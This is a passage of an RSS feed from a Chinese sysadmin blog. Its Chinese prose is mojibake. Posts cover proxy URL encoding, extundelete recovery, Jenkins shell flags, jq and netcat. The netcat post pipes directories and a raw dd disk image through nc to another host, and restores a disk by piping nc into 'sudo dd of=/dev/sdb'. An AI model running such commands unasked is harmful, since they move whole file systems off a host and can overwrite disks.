&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨kubernetesä¸­åŸºæœ¬æ‰€æœ‰èµ„æºçš„ä¸€çº§å±æ€§éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸»è¦åŒ…å«5éƒ¨åˆ†ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>urlä¸­çš„å­—ç¬¦è½¬ä¹‰</title>
      <link>https://rendoumi.com/posts/20240119-url_encode/</link>
      <pubDate>Fri, 19 Jan 2024 12:08:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-url_encode/</guid>
      <description>&lt;p&gt;é‡åˆ°ä¸ªæ€ªé—®é¢˜ï¼Œè®¾ç½®http_proxyçš„æ—¶å€™æœ‰ç”¨æˆ·å¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;http_proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://user&lt;span class=&#34;se&#34;&gt;\2&lt;/span&gt;016:PmnQ 2016@192.168.0.1:3128  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœä¸ç”Ÿæ•ˆï¼Œä»”ç»†è§‚å¯Ÿä¸Šé¢çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·åå…¶å®æ˜¯ï¼š&amp;ldquo;user\2016&amp;rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªåæ–œæ \&lt;/p&gt;
&lt;p&gt;è€Œå¯†ç æ˜¯ï¼š&amp;ldquo;PmnQ 2016&amp;rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªç©ºæ ¼&lt;/p&gt;
&lt;p&gt;è¿™ä¸‹éº»çƒ¦äº†ï¼Œå‘½ä»¤è¿‡ä¸å»å•Šã€‚&lt;/p&gt;
&lt;p&gt;åå¤æœç´¢æ‰¾åˆ°äº†å­—ç¬¦è½¬ä¹‰è¡¨ï¼Œç¬¬ä¸€ä¸ªå›¾æ˜¯å¯ä»¥å®‰å…¨è½¬ä¹‰çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240119131946433&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240119-url_encode/image-20240119131946433.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¿™å¼ æ˜¯ä¸å®‰å…¨çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240119132010631&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240119-url_encode/image-20240119132010631.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è½¬ä¸€ä¸‹å§ï¼š \ çš„16è¿›åˆ¶HEXæ˜¯%5Cï¼Œç©ºæ ¼çš„16è¿›åˆ¶HEXæ˜¯%20&lt;/p&gt;
&lt;p&gt;æœ€åçš„è¯­æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;http_proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://user%5C2016:PmnQ%202016@192.168.0.1:3128  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æå®šæ”¶å·¥ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•é€šè¿‡extundeleteæ¢å¤åˆ é™¤æ–‡ä»¶</title>
      <link>https://rendoumi.com/posts/20240119-extundelete/</link>
      <pubDate>Fri, 19 Jan 2024 12:06:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-extundelete/</guid>
      <description>&lt;p&gt;è€ƒå¤ç¯‡ï¼Œè®°å½•ä¸‹æ¥ï¼Œç°åœ¨éƒ½æ˜¯xfsäº†ï¼Œä½†æ˜¯æ–¹æ³•ä¸èƒ½å¿˜å•Šï¼&lt;/p&gt;
&lt;p&gt;æ¢å¤è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h6 id=&#34;1å®‰è£…extundelete&#34;&gt;1ã€å®‰è£…extundelete&lt;/h6&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -jxvf extundelete-0.2.4.tar.bz2  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; extundelete-0.2.4  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h6 id=&#34;2å¸è½½è¦æ¢å¤çš„åˆ†åŒº&#34;&gt;2ã€å¸è½½è¦æ¢å¤çš„åˆ†åŒº&lt;/h6&gt;
&lt;p&gt;å¦‚æœä½ è¯¯åˆ é™¤çš„åˆ†åŒºæ˜¯/dev/sda2,é‚£ä¹ˆé¦–å…ˆéœ€è¦umount è¿™ä¸ªåˆ†åŒºçš„æŒ‚è½½ç‚¹&lt;/p&gt;
&lt;h6 id=&#34;3å¼€å§‹æ¢å¤&#34;&gt;3ã€å¼€å§‹æ¢å¤&lt;/h6&gt;
&lt;p&gt;é¦–å…ˆdf -lhæŸ¥çœ‹åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µï¼Œé€‰æ‹©ä¸€ä¸ªå‰©ä½™ç©ºé—´è¶³å¤Ÿå®¹çº³è¦æ¢å¤çš„æ–‡ä»¶å¤§å°çš„åˆ†åŒºï¼Œä¾‹å¦‚ä½ çš„/homeåˆ†åŒºå‰©ä½™100Gï¼Œä½ éœ€è¦æ¢å¤çš„æ–‡ä»¶å°äº100Gï¼Œé‚£ä¹ˆä½ å¯ä»¥cd /home ç„¶åè¿›è¡Œæ¢å¤æ“ä½œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¢å¤å•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;extundelete /dev/mapper/vg_localhost-lv_home â€“restore-files æ–‡ä»¶å  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘æ˜¯ç›´æ¥æ¢å¤æ•´ä¸ªåˆ†åŒº&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;extundelete /dev/mapper/vg_localhost-lv_home â€“restore-all  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªæ¢å¤æ–‡ä»¶å¤¹ï¼Œè¿›å»æ‰¾ä½ è¦çš„æ–‡ä»¶å°±å¯ä»¥äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>netcatçš„ä¸€äº›è¿œç¨‹ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20240119-netcat/</link>
      <pubDate>Fri, 19 Jan 2024 12:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-netcat/</guid>
      <description>&lt;p&gt;ä¸€ã€è¿œç¨‹ä¼ è¾“æ–‡ä»¶å‹ç¼©åŒ…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zcvf - /export/A0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc 192.168.86.5 &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -l &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt; &amp;gt; A0.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–¹å‘å€’è¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨æœåŠ¡ç«¯å‹ç¼©æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zcvf - /export/A0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc -l -p8732
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc 192.168.86.5 &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt; &amp;gt; A0.tar.gz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€è¿œç¨‹ä¼ è¾“æ•´ä¸ªç›®å½•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar cvf - /export/A0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc 192.168.86.5 &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -l &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tar xvf -  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€è¿œç¨‹å¤‡ä»½åˆ†åŒºåˆ°ä¸€ä¸ªæ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/sdb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gzip -c &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc 192.168.86.5 &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; dd &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/backup/sdb.img.gz  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å››ã€å°†è¿œç¨‹åˆ†åŒºå¤‡ä»½æ–‡ä»¶æ‹‰åˆ°æœ¬åœ°å¹¶æ¢å¤åˆ†åŒº&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /backup/sdb.img.gz &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc 192.168.86.5 &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;8732&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gunzip -c &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo dd &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/sdb  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹Screenä¹±ç </title>
      <link>https://rendoumi.com/posts/20240119-screen_utf/</link>
      <pubDate>Fri, 19 Jan 2024 12:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-screen_utf/</guid>
      <description>&lt;p&gt;å¾ˆçƒ¦èºçš„é—®é¢˜ï¼ŒTerminal ç»ˆç«¯æ˜¯UTF8ï¼Œæ˜¾ç¤ºæ— é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;å¯æ˜¯è¿è¡Œ screen åå°±ä¹±ç ï¼Œscreen åçš„ env ç¯å¢ƒè·Ÿä¹‹å‰ä¸€æ ·ï¼Œå®Œå…¨æ— é—®é¢˜&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨è‡ªå·±ç”¨æˆ·çš„.screenrcä¸­åŠ ä¸¤å¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;defencoding utf-8  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;encoding utf-8 utf-8  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾—æŠŠç¯å¢ƒå˜é‡å¸¦åˆ°screenä¸­ï¼Œæ‰è¡Œã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>jenkinsä¸­execute shellçš„æ³¨æ„äº‹é¡¹</title>
      <link>https://rendoumi.com/posts/20240119-jenkins_shell/</link>
      <pubDate>Fri, 19 Jan 2024 12:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-jenkins_shell/</guid>
      <description>&lt;p&gt;ç¼ºçœjenkinsçš„execute shellçš„æ–¹å¼æ˜¯å¦‚ä¸‹å¸¦ç€å‚æ•°çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sh -xe hudsonxxx.sh  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´æ˜ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-e æ‰“å¼€å¼€å…³ è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+e å…³ä¸Šå¼€å…³
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-x æ‰“å¼€å¼€å…³ è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+x å…³ä¸Šå¼€å…³
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -e è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -x è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -o pipefail  è¡¨ç¤ºåœ¨ç®¡é“è¿æ¥çš„å‘½ä»¤åºåˆ—ä¸­ï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå‘½ä»¤è¿”å›é0å€¼ï¼Œåˆ™æ•´ä¸ªç®¡é“è¿”å›é0å€¼ï¼Œå³ä½¿æœ€åä¸€ä¸ªå‘½ä»¤è¿”å›0.  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„åœ¨å¼•ç”¨nvmä»¥åŠmeteorçš„ç¯å¢ƒä¸­ï¼Œè¦è®¾ç½®set +e å¦åˆ™source nvm.shçš„è¿‡ç¨‹å®¹æ˜“å‡ºé”™ï¼&lt;/p&gt;</description>
    </item>
    <item>
      <title>linuxä¸‹å¦‚ä½•åœ¨å‘½ä»¤è¡Œä¸‹è§£æå¤„ç†jsonæ–‡ä»¶</title>
      <link>https://rendoumi.com/posts/20240119-jq/</link>
      <pubDate>Fri, 19 Jan 2024 10:13:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-jq/</guid>
      <description>&lt;p&gt;æœ€è¿‘è°ƒè¯•Elasticsearchæ¯”è¾ƒå¤šï¼Œè€ç”¨curlæ¥æŸ¥çœ‹æ•°æ®ï¼Œpretty=onå›ºç„¶æ˜¯å¥½ï¼Œå¯æ˜¯å¦‚æœè¦å…·ä½“çœ‹ä¼ å›æ¥çš„jsonæ•°æ®ï¼Œè¿˜æ˜¯ä¸æ–¹ä¾¿ï¼Œå¦å¤–å¦‚æœæƒ³åœ¨shellé‡Œå¤„ç†jsonæ ¼å¼ï¼Œå°±ä¸çŸ¥é“å¦‚ä½•æ˜¯å¥½äº†ã€‚å°±è¢«è¿«æ”¹ç”¨pythonäº†ï¼Œæœ‰æ²¡æœ‰åœ¨shellä¸‹è°ƒè¯•jsonçš„å·¥å…·å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æœ‰ï¼Œå°±æ˜¯jqï¼Œå®‰è£…so easyï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://stedolan.github.io/jq/download/linux32/jq &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;32-bit system&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://stedolan.github.io/jq/download/linux64/jq &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64-bit system&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x ./jq  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv jq /usr/local/bin  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»™ä¸ªjsonæ ·æœ¬æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat google.json  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Google&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;s2&#34;&gt;&amp;#34;street&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1600 Amphitheatre Parkway&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;s2&#34;&gt;&amp;#34;city&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mountain View&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;s2&#34;&gt;&amp;#34;state&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;California&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;s2&#34;&gt;&amp;#34;country&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;US&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;employees&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Michael&amp;#34;&lt;/span&gt;,
